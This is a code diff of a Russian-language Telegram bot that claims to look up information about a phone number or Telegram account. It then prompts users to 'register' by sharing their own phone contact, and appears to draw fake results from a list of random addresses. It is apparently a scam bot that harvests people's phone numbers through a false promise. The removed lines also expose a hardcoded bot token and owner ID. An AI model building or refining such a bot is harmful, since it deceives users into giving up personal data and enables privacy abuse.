@@ -3,9 +3,14 @@ import telebot
 from telebot import types
 import time
 import random
+import os
+from dotenv import load_dotenv
 
-ID = '5682119639'
-bot = telebot.TeleBot("5707705455:AAHlsxL6qKp8NyZtFMtBCwM69a660auRLoY")
+load_dotenv()
+
+ID = os.getenv('ID')
+bot = telebot.TeleBot(os.getenv('TOKEN'))
+
 adr = ['Тверская улица, дом 13', 'Проспект 60-летия Октября', 'Улица Винокурова', '3-й Голутвинский переулок']
 bot.send_message(ID, '!BOT STARTED!') 
 print("Бот запущен!")
@@ -13,7 +18,7 @@ print("Бот запущен!")
 @bot.message_handler(commands=['start'])
 def start(message):
 	bot.send_message(message.chat.id, '''👋 Привет! 👋
-		Это бот, который, может показать информацию по номеру телефона!
+		Это бот, который, может показать информацию по Telegram аккаунту!
 	Для поиска информации, введите команду /getinfo''') 
 	
 @bot.message_handler(commands=['lamer112311dev'])
@@ -22,7 +27,7 @@ def start(message):
 
 @bot.message_handler(commands=['getinfo'])
 def start(message):
-	msg = bot.send_message(message.chat.id, 'Введите любой номер телефона') 
+	msg = bot.send_message(message.chat.id, 'Введите ID или username') 
 	bot.register_next_step_handler(msg, proc2)
 
 def proc2(message):
@@ -31,11 +36,11 @@ def proc2(message):
 		user_input = message.text
 		num = user_input.replace('+', '')
 
-		if not num.isdigit():
-			msg = bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
-			return
+		#if not num.isdigit():
+		#	msg = bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
+		#	return
 
-		bot.send_message(m_id, f'Запрос на номер {num} отправлен!')
+		bot.send_message(m_id, f'Запрос на аккаунт {num} отправлен!')
 		time.sleep(2)
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
